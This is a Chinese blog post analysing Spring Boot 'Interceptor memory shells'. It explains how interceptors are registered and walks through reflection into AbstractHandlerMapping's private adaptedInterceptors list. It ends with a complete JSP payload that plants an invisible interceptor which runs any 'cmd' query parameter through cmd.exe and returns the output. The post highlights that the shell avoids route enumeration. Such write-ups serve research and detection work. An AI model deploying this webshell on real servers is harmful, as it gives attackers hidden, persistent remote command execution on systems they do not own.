---
title: 原理分析 | Interceptor —— SpringBoot 内存马
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/o4XiEfFPACEzSDs3BADAIVb87bTA9ECBAfEpfA~tplv-dy-aweme-images-ds-rs-v1_1920_1080_q80.jpg
categories:
  - 代码审计
  - 内存马
tags:
  - Java
  - Spring
  - Interceptor
  - 内存马
abbrlink: b8e4f2a6
date: 2026-04-29 12:19:00
---

# 原理分析 | Interceptor —— SpringBoot 内存马

## 目录

- [前言](#前言)
- [Interceptor 是什么](#interceptor-是什么)
- [静态注册原理](#静态注册原理)
- [静态注册 Demo](#静态注册-demo)
- [动态注册（内存马）](#动态注册内存马)
- [JSP Payload](#jsp-payload)
- [验证](#验证)
- [总结](#总结)

---

## 前言

还是利用上篇的环境，这篇写 Interceptor 内存马。

Interceptor 和 Controller 内存马最大的区别在于：Controller 内存马注册了一个新路径 `/shell`，只有访问这个路径才触发；Interceptor 内存马不产生新路径，塞进拦截器链之后，**任意请求都会触发**，隐蔽性更强。

---

## Interceptor 是什么

Interceptor 类似 Filter 的拦截，功能上很像，都是拦截请求在业务逻辑前后做处理，但层级不同：

```
请求进来
    ↓
Filter（Tomcat层，最外层）
    ↓
DispatcherServlet
    ↓
Interceptor（Spring层，更靠近Controller）
    ↓
Controller
```

Interceptor 有三个方法：

| 方法 | 执行时机 | 说明 |
| --- | --- | --- |
| `preHandle` | Controller 执行之前 | 返回 false 就拦截，不往下走 |
| `postHandle` | Controller 执行之后 | 可以修改响应 |
| `afterCompletion` | 响应渲染完成后 | 清理资源用 |

内存马注入的是 `preHandle`，请求一进来就执行命令。

**常见用途对比：**

| | Filter | Interceptor |
| --- | --- | --- |
| 鉴权登录校验 | ✓ | ✓ |
| 日志记录 | ✓ | ✓ |
| 跨域处理 | ✓ | ✓ |
| 请求参数修改 | ✓ | ✗（太晚了） |
| 获取 Controller 信息 | ✗ | ✓（handler 参数） |
| 操作 ModelAndView | ✗ | ✓（postHandle） |

实际开发中：

- **Filter** 更多做通用处理，比如编码设置、跨域、IP 黑名单
- **Interceptor** 更多做业务层面的拦截，比如登录校验、权限验证、接口耗时统计

开发者写 **Filter** 只需写 `@WebFilter` 一个注解搞定，但 **Interceptor** 稍微麻烦一点，需要自己注册，下面先看正常的静态注册流程。

---

## 静态注册原理

静态注册的整体流程：

```
WebConfig.addInterceptors(registry)
    ↓
registry.addInterceptor(evilInterceptor)
    ↓
Spring 内部把它塞进 adaptedInterceptors 这个 List
    ↓
等待请求触发
```

**一、Spring 怎么知道要调 `addInterceptors()`**

Spring 启动时会扫描所有实现了 `WebMvcConfigurer` 接口的类，然后自动调用接口里定义的所有方法。前提是类被 Spring 管理，必须有注解：

```
有 @Configuration / @Component 注解
        +
实现了 WebMvcConfigurer 接口
        ↓
Spring 启动时才会扫描到并调用 addInterceptors()
```

类比 Filter：

```java
// Filter 需要 @WebFilter 告诉 Tomcat 来扫描
@WebFilter("/*")
public class MyFilter implements Filter { ... }

// Interceptor 需要 @Configuration/@Component 告诉 Spring 来扫描
@Configuration
public class WebConfig implements WebMvcConfigurer { ... }
```

Tomcat 启动时找所有 `Filter` 实现类调 `doFilter`，Spring 启动时找所有 `WebMvcConfigurer` 实现类调 `addInterceptors`，思路是一样的：

```java
// Tomcat 规定：Filter 必须实现这个接口
public interface Filter {
    void doFilter(...);
}

// Spring 规定：配置类实现这个接口
public interface WebMvcConfigurer {
    void addInterceptors(InterceptorRegistry registry);
}
```

**二、`registry` 从哪来的**

`registry` 是 Spring 传进来的，不是自己创建的：

```java
// Spring 调用这个方法时，自己 new 了一个 registry 传进来
public void addInterceptors(InterceptorRegistry registry) {
    registry.addInterceptor(new EvilInterceptor());
}
```

类比快递：Spring 是快递公司，`registry` 是给你的收件箱，你往里放拦截器，快递公司拿走统一处理，不需要关心 `registry` 怎么来的。

**三、`addInterceptors()` 执行完之后怎么进 `adaptedInterceptors`**

```
调用 registry.addInterceptor(evilInterceptor)
    ↓
registry 内部把 evilInterceptor 存进自己的临时 List
    ↓
Spring 拿到 registry，把里面的拦截器取出来
    ↓
塞进 AbstractHandlerMapping.adaptedInterceptors
```

类比 Filter 注册：

```java
// Filter 注册：直接往 StandardContext 里塞
standardContext.addFilterDef(filterDef);
standardContext.addFilterMapBefore(filterMap);
filterConfigs.put("evil", filterConfig);

// Interceptor 静态注册：通过 registry 中转
registry.addInterceptor(evilInterceptor); // 放进中转站
// Spring 自动把中转站里的东西转移到 adaptedInterceptors
```

内存马之所以要反射，就是**跳过 registry 这个中转站**，直接往 `adaptedInterceptors` 里塞。因为启动阶段结束之后 Spring 就不再扫描 `WebMvcConfigurer` 了，`registry` 也消失了，运行时唯一能访问到的入口就是 `adaptedInterceptors`：

```java
// 内存马：跳过中转，直接塞进去
adaptedInterceptors.add(evilInterceptor);
```

串起来对比：

```
静态注册：
WebConfig.addInterceptors(registry)
    → registry.addInterceptor(拦截器)
    → Spring 把 registry 里的拦截器转移到 adaptedInterceptors
    → 等待请求触发

动态注册（内存马）：
反射拿到 adaptedInterceptors
    → 直接 add(恶意拦截器)
    → 等待请求触发
```

两种方式最终结果一样，都是把拦截器塞进 `adaptedInterceptors`，只是路径不同。

---

## 静态注册 Demo

先写一个正常的静态 Interceptor 看看效果，再上内存马。

**EvilInterceptor.java**

```java
package com.example.demos.web;

import org.springframework.stereotype.Component;
import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

// @Component — 告诉 Spring 这个类是一个组件，纳入容器管理
// 这样 WebConfig 里才能 @Autowired 注入它
// 其实可以不写，WebConfig 里直接 new 出来也行：new EvilInterceptor()
@Component
// HandlerInterceptor — Spring MVC 的拦截器接口，必须实现它
public class EvilInterceptor implements HandlerInterceptor {

    // preHandle — Controller 执行之前触发
    // 返回 true 放行，返回 false 拦截，请求到此为止
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("preHandle 触发了，请求路径：" + request.getRequestURI());
        return true; // 放行
    }

    // postHandle — Controller 执行之后触发
    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, org.springframework.web.servlet.ModelAndView modelAndView) {
        System.out.println("postHandle 触发了");
    }

    // afterCompletion — 响应渲染完成后触发，一般用来清理资源
    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) {
        System.out.println("afterCompletion 触发了");
    }
}
```

**WebConfig.java**

```java
package com.example.demos.web;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

// @Configuration / @Component 都行
// Spring 启动时扫描的条件：
// 1. 类被 Spring 管理（有 @Component、@Configuration 等注解）
// 2. 实现了 WebMvcConfigurer 接口
// 满足这两个条件，Spring 就会自动调用 addInterceptors()
@Component
// 实现 WebMvcConfigurer 接口，重写 addInterceptors() 方法
public class WebConfig implements WebMvcConfigurer {

    // 前面写了 @Component 可以直接 @Autowired 注入
    // 如果不写 @Component 就需要改成：EvilInterceptor evilInterceptor = new EvilInterceptor();
    @Autowired
    private EvilInterceptor evilInterceptor;

    // 把拦截器注册进 Spring MVC
    // /* 只能拦截一级路径，/** 拦截所有路径（Ant 风格）
    // 对比 Filter（Servlet规范）：/* 就是所有路径，规范不同
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(evilInterceptor)
                .addPathPatterns("/**"); // 拦截所有路径
    }
}
```

随便访问一个路径就会触发，访问 `http://127.0.0.1:8080/hello`，即使路径不存在也能被触发。

因为 Interceptor 是在 `DispatcherServlet` 之后、Controller 之前触发的，不管路径存不存在，只要请求进了 `DispatcherServlet` 就会过拦截器：

```
请求 /不存在的路径
    ↓
DispatcherServlet 接收
    ↓
Interceptor.preHandle() 触发 ← 这里已经触发了
    ↓
查路由表找不到对应 Controller
    ↓
转发到 /error
    ↓
Interceptor.preHandle() 再触发一次 ← /error 也过一遍
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260429082933324.png)

控制台可以看到三个方法依次触发：preHandle → postHandle → afterCompletion。

---

## 动态注册（内存马）

思路就是找到 `adaptedInterceptors`，构造恶意 Interceptor 塞进去。

**Step 1：拿到 `handlerMapping`**

和 Controller 内存马一样，从 Spring 容器里取：

```java
// Java 版用 @Autowired 直接注入
@Autowired
private RequestMappingHandlerMapping handlerMapping;

// JSP 版手动取
WebApplicationContext context = WebApplicationContextUtils
        .getWebApplicationContext(request.getServletContext());
RequestMappingHandlerMapping handlerMapping =
        context.getBean(RequestMappingHandlerMapping.class);
```

**Step 2：反射拿到 `adaptedInterceptors`**

这个字段是私有的，而且在父类 `AbstractHandlerMapping` 里，`getDeclaredField` 只找当前类不找父类，所以要遍历父类找：

```
RequestMappingHandlerMapping        ← handlerMapping 的实际类型，没有这个字段
    ↑ 继承
RequestMappingInfoHandlerMapping    ← 没有这个字段
    ↑ 继承
AbstractHandlerMapping              ← adaptedInterceptors 在这里
```

```java
Field field = null;
// 拿到 handlerMapping 当前类，从这里开始往上找
Class<?> clazz = handlerMapping.getClass();
while (clazz != null) {
    try {
        field = clazz.getDeclaredField("adaptedInterceptors");
        break; // 找到退出
    } catch (NoSuchFieldException e) {
        clazz = clazz.getSuperclass(); // 没找到往父类找
    }
}
field.setAccessible(true); // 破坏私有限制
List<HandlerInterceptor> adaptedInterceptors =
        (List<HandlerInterceptor>) field.get(handlerMapping);
```

`field.get(handlerMapping)` 是取 `handlerMapping` 这个对象里 `adaptedInterceptors` 字段的值，必须传入对象，因为这是实例字段不是静态字段。

**Step 3：构造恶意 Interceptor 塞进去**

这里用的是匿名内部类，和 Filter 内存马一样的写法：

```java
// 正常具名类写法：先定义再实例化
public class EvilInterceptor implements HandlerInterceptor { ... }
EvilInterceptor evil = new EvilInterceptor();
adaptedInterceptors.add(evil);

// 匿名内部类写法：定义和实例化合并成一步，用完即丢
adaptedInterceptors.add(new HandlerInterceptor() {
    @Override
    public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response,
                             Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if (cmd != null && !cmd.isEmpty()) {
            // 执行命令，返回结果
            ...
            return false; // 拦截，不往下走
        }
        return true; // 没有 cmd 参数正常放行
    }
});
```

和静态注册对比：

```
静态注册：
registry.addInterceptor() → Spring 转移到 adaptedInterceptors

动态注册：
反射拿到 adaptedInterceptors → 直接 add()
```

跳过了 `registry` 中转，直接操作最终存储的 List，效果完全一样。

---

## JSP Payload

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.springframework.web.context.WebApplicationContext" %>
<%@ page import="org.springframework.web.context.support.WebApplicationContextUtils" %>
<%@ page import="org.springframework.web.servlet.HandlerInterceptor" %>
<%@ page import="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.List" %>

<%
    // Step 1: 拿到 handlerMapping
    WebApplicationContext context = WebApplicationContextUtils
            .getWebApplicationContext(request.getServletContext());
    RequestMappingHandlerMapping handlerMapping =
            context.getBean(RequestMappingHandlerMapping.class);

    // Step 2: 反射拿到 adaptedInterceptors（在父类 AbstractHandlerMapping 里，需要遍历父类）
    Field field = null;
    Class<?> clazz = handlerMapping.getClass();
    while (clazz != null) {
        try {
            field = clazz.getDeclaredField("adaptedInterceptors");
            break;
        } catch (NoSuchFieldException e) {
            clazz = clazz.getSuperclass();
        }
    }
    field.setAccessible(true);
    List<HandlerInterceptor> adaptedInterceptors =
            (List<HandlerInterceptor>) field.get(handlerMapping);

    // Step 3: 构造恶意 Interceptor 塞进去
    adaptedInterceptors.add(new HandlerInterceptor() {
        @Override
        public boolean preHandle(javax.servlet.http.HttpServletRequest request,
                                 javax.servlet.http.HttpServletResponse response,
                                 Object handler) throws Exception {
            String cmd = request.getParameter("cmd");
            if (cmd != null && !cmd.isEmpty()) {
                ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", cmd);
                pb.redirectErrorStream(true);
                Process process = pb.start();
                java.io.InputStream is = process.getInputStream();
                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                byte[] buf = new byte[1024];
                int len;
                while ((len = is.read(buf)) != -1) {
                    baos.write(buf, 0, len);
                }
                response.getWriter().write(baos.toString());
                return false; // 拦截，不放行
            }
            return true; // 没有 cmd 参数正常放行
        }
    });

    response.getWriter().write("注入成功！任意路径带上 ?cmd=whoami 验证");
%>
```

---

## 验证

访问 `http://127.0.0.1:8080/inject.jsp` 触发注入：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260429111810516.png)

访问 `http://127.0.0.1:8080/?cmd=whoami`，任意路径带上 `cmd` 参数都能触发，不需要特定路径：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260429111915952.png)

重启后直接访问报错，证明内存马生效，重启即失效：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260429112023475.png)

---

## 总结

Interceptor 内存马三步：

```
拿到 handlerMapping（Spring 容器里取）
        ↓
反射遍历父类找到 adaptedInterceptors（私有字段，在 AbstractHandlerMapping 里）
        ↓
add(恶意 Interceptor) 塞进拦截器链
```

和前几种内存马横向对比：

| | Filter 内存马 | Controller 内存马 | Interceptor 内存马 |
| --- | --- | --- | --- |
| 触发方式 | 任意请求 | 访问指定路径 | 任意请求 |
| 作用层 | Tomcat 层 | Spring 层 | Spring 层 |
| 注册方式 | 反射修改私有集合 | 官方公开 API | 反射修改私有字段 |
| 隐蔽性 | 高 | 中（路由可枚举） | 高 |

Controller 内存马用的是官方公开 API `registerMapping()`，Interceptor 内存马则要反射硬改私有字段，因为 Spring 没有提供运行时动态注册拦截器的公开接口。隐蔽性上 Interceptor 比 Controller 强，不产生新路由，Actuator `/actuator/mappings` 枚举不到，任意路径都能触发，更接近 Filter 内存马的效果。
